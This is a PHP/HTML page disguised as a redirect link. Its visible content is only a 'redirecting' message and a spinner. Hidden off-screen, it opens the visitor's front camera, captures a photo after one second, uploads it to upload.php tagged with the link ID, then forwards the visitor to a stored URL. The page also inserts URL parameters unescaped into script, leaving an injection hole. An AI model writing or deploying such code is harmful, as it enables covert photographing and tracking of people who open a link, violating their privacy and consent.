<?php
// 配置信息
$json_file = 'links.json';
$images_file = 'images.json';
$images_dir = 'images/';

// 确保images.json存在
if (!file_exists($images_file)) {
    file_put_contents($images_file, json_encode(array()));
}

$query_id = $_GET['id'] ?? '';
$redirect_url = '';

if ($query_id) {
    // 读取链接数据
    $links = json_decode(file_get_contents($json_file), true);
    
    if (isset($links[$query_id])) {
        $redirect_url = $links[$query_id];
    } else {
        die('无效的查询ID！');
    }
} else {
    die('未提供查询ID！');
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>拍摄中...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000;
            color: white;
            text-align: center;
        }
        #camera-container {
            position: absolute;
            top: -1000px;
            left: -1000px;
            width: 100px;
            height: 100px;
        }
        #video {
            width: 100%;
            height: 100%;
        }
        #message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
        }
        #loading {
            margin-top: 20px;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: auto;
            margin-right: auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="camera-container">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>
    
    <div id="message">
        <div>跳转中...</div>
        <div id="loading"></div>
    </div>

    <script>
        // 获取视频和画布元素
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        // 启动摄像头
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
                
                // 等待视频加载完成后拍照
                video.onloadedmetadata = () => {
                    // 设置画布尺寸与视频一致
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // 延迟拍照，确保摄像头已启动
                    setTimeout(() => {
                        captureImage();
                    }, 1000);
                };
            })
            .catch(error => {
                console.error('无法访问摄像头:', error);
                // 即使无法访问摄像头也继续跳转
                redirectToUrl();
            });
        
        // 拍照并上传
        function captureImage() {
            // 绘制视频帧到画布
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // 将画布内容转换为base64
            const imageData = canvas.toDataURL('image/jpeg');
            
            // 上传图片到服务器
            fetch('upload.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData) + '&query_id=<?php echo $query_id; ?>'
            })
            .then(response => response.text())
            .then(result => {
                console.log('上传结果:', result);
                // 无论上传结果如何，都跳转到指定URL
                redirectToUrl();
            })
            .catch(error => {
                console.error('上传失败:', error);
                // 即使上传失败也继续跳转
                redirectToUrl();
            });
        }
        
        // 跳转到目标URL
        function redirectToUrl() {
            window.location.href = '<?php echo $redirect_url; ?>';
        }
    </script>
</body>
</html>